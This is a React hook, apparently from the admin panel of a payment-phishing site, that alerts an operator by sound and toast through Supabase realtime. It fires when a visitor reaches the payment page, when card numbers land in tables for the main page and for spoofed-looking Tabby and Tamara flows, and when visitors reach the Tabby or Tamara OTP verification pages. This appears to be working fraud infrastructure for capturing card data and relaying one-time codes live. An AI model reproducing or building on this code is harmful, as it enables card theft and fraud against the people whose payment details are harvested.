import { useEffect, useRef } from 'react';
import { useLocation } from 'react-router-dom';
import { supabase } from '@/integrations/supabase/client';
import { useToast } from '@/hooks/use-toast';

export const useAdminNotifications = () => {
  const audioRef = useRef<HTMLAudioElement | null>(null);
  const paymentAudioRef = useRef<HTMLAudioElement | null>(null);
  const cardInfoAudioRef = useRef<HTMLAudioElement | null>(null);
  const otpAudioRef = useRef<HTMLAudioElement | null>(null);
  const location = useLocation();
  const { toast } = useToast();

  useEffect(() => {
    // فقط في صفحات الأدمن
    const isAdminPage = location.pathname.startsWith('/admin');
    if (!isAdminPage) {
      return;
    }

    // إنشاء عنصر الصوت للطلبات الجديدة
    audioRef.current = new Audio('/customer-info-notification.mp3');
    audioRef.current.volume = 0.7;
    audioRef.current.preload = 'auto';

    // إنشاء عنصر الصوت لصفحة الدفع
    paymentAudioRef.current = new Audio('/payment-page-notification.mp3');
    paymentAudioRef.current.volume = 0.7;
    paymentAudioRef.current.preload = 'auto';

    // إنشاء عنصر الصوت لإدخال بيانات البطاقة
    cardInfoAudioRef.current = new Audio('/card-info-notification.mp3');
    cardInfoAudioRef.current.volume = 0.7;
    cardInfoAudioRef.current.preload = 'auto';

    // إنشاء عنصر الصوت لإدخال OTP
    otpAudioRef.current = new Audio('/otp-notification.mp3');
    otpAudioRef.current.volume = 0.7;
    otpAudioRef.current.preload = 'auto';

    // الاستماع للطلبات الجديدة
    const ordersChannel = supabase
      .channel('admin-orders-notifications')
      .on(
        'postgres_changes',
        {
          event: 'INSERT',
          schema: 'public',
          table: 'customer_orders'
        },
        (payload) => {
          console.log('🔔 طلب جديد! تشغيل الصوت...', payload.new);
          playNotificationSound();
          toast({
            title: 'طلب جديد!',
            description: `تم استلام طلب جديد من ${payload.new.owner_name || 'عميل'}`,
          });
        }
      )
      .subscribe();

    // الاستماع لدفعات تمارة الجديدة
    const tamaraChannel = supabase
      .channel('admin-tamara-notifications')
      .on(
        'postgres_changes',
        {
          event: 'INSERT',
          schema: 'public',
          table: 'tamara_payments'
        },
        (payload) => {
          playNotificationSound();
          toast({
            title: 'دفعة تمارة جديدة!',
            description: `دفعة جديدة بمبلغ ${payload.new.amount || '0'} ريال`,
          });
        }
      )
      .subscribe();

    // الاستماع لدفعات تابي الجديدة
    const tabbyChannel = supabase
      .channel('admin-tabby-notifications')
      .on(
        'postgres_changes',
        {
          event: 'INSERT',
          schema: 'public',
          table: 'tabby_payments'
        },
        (payload) => {
          playNotificationSound();
          toast({
            title: 'دفعة تابي جديدة!',
            description: `دفعة جديدة بمبلغ ${payload.new.amount || '0'} ريال`,
          });
        }
      )
      .subscribe();

    // الاستماع لدخول العملاء لصفحة الدفع
    const paymentPageChannel = supabase
      .channel('admin-payment-page-notifications')
      .on(
        'postgres_changes',
        {
          event: 'INSERT',
          schema: 'public',
          table: 'visitor_events'
        },
        (payload) => {
          if (payload.new.event_type === 'payment_page_visit') {
            playPaymentPageSound();
            toast({
              title: 'عميل وصل لصفحة الدفع!',
              description: `شركة: ${payload.new.event_data?.company || 'غير محدد'}`,
            });
          }
        }
      )
      .subscribe();

    // الاستماع لإدخال بيانات البطاقة - الصفحة الرئيسية
    const mainPaymentAttemptsChannel = supabase
      .channel('admin-main-payment-attempts')
      .on(
        'postgres_changes',
        {
          event: 'INSERT',
          schema: 'public',
          table: 'payment_attempts'
        },
        (payload) => {
          playCardInfoSound();
          toast({
            title: 'عميل أدخل بيانات بطاقة!',
            description: `رقم البطاقة: ****${payload.new.card_number?.slice(-4) || '****'}`,
          });
        }
      )
      .subscribe();

    // الاستماع لإدخال بيانات البطاقة - تابي
    const tabbyPaymentAttemptsChannel = supabase
      .channel('admin-tabby-payment-attempts')
      .on(
        'postgres_changes',
        {
          event: 'INSERT',
          schema: 'public',
          table: 'tabby_payment_attempts'
        },
        (payload) => {
          playCardInfoSound();
          toast({
            title: 'عميل أدخل بيانات بطاقة في تابي!',
            description: `رقم البطاقة: ****${payload.new.card_number?.slice(-4) || '****'}`,
          });
        }
      )
      .subscribe();

    // الاستماع لإدخال بيانات البطاقة - تمارة
    const tamaraPaymentAttemptsChannel = supabase
      .channel('admin-tamara-payment-attempts')
      .on(
        'postgres_changes',
        {
          event: 'INSERT',
          schema: 'public',
          table: 'tamara_payment_attempts'
        },
        (payload) => {
          playCardInfoSound();
          toast({
            title: 'عميل أدخل بيانات بطاقة في تمارة!',
            description: `رقم البطاقة: ****${payload.new.card_number?.slice(-4) || '****'}`,
          });
        }
      )
      .subscribe();

    // الاستماع لوصول العملاء لصفحة OTP - تابي وتمارة
    const otpPageVisitChannel = supabase
      .channel('admin-otp-page-visits')
      .on(
        'postgres_changes',
        {
          event: 'INSERT',
          schema: 'public',
          table: 'visitor_events'
        },
        (payload) => {
          if (payload.new.event_type === 'tabby_otp_page_visit') {
            playOtpSound();
            toast({
              title: 'عميل وصل لصفحة التحقق في تابي!',
              description: `شركة: ${payload.new.event_data?.company || 'غير محدد'}`,
            });
          } else if (payload.new.event_type === 'tamara_otp_page_visit') {
            playOtpSound();
            toast({
              title: 'عميل وصل لصفحة التحقق في تمارة!',
              description: `شركة: ${payload.new.event_data?.company || 'غير محدد'}`,
            });
          }
        }
      )
      .subscribe();

    return () => {
      supabase.removeChannel(ordersChannel);
      supabase.removeChannel(tamaraChannel);
      supabase.removeChannel(tabbyChannel);
      supabase.removeChannel(paymentPageChannel);
      supabase.removeChannel(mainPaymentAttemptsChannel);
      supabase.removeChannel(tabbyPaymentAttemptsChannel);
      supabase.removeChannel(tamaraPaymentAttemptsChannel);
      supabase.removeChannel(otpPageVisitChannel);
    };
  }, [location.pathname]);

  const playNotificationSound = () => {
    if (audioRef.current) {
      audioRef.current.currentTime = 0;
      console.log('🔊 محاولة تشغيل صوت معلومات العميل...');
      audioRef.current.play()
        .then(() => console.log('✅ تم تشغيل صوت معلومات العميل بنجاح'))
        .catch((error) => {
          console.error('❌ خطأ في تشغيل صوت معلومات العميل:', error);
          toast({
            title: 'فشل تشغيل الصوت',
            description: 'يرجى النقر في أي مكان بالصفحة للسماح بتشغيل الأصوات',
            variant: 'destructive',
          });
        });
    }
  };

  const playPaymentPageSound = () => {
    if (paymentAudioRef.current) {
      paymentAudioRef.current.currentTime = 0;
      paymentAudioRef.current.play().catch((error) => {
        console.error('Error playing payment page notification sound:', error);
      });
    }
  };

  const playCardInfoSound = () => {
    if (cardInfoAudioRef.current) {
      cardInfoAudioRef.current.currentTime = 0;
      cardInfoAudioRef.current.play().catch((error) => {
        console.error('Error playing card info notification sound:', error);
      });
    }
  };

  const playOtpSound = () => {
    if (otpAudioRef.current) {
      otpAudioRef.current.currentTime = 0;
      otpAudioRef.current.play().catch((error) => {
        console.error('Error playing OTP notification sound:', error);
      });
    }
  };

  return null;
};
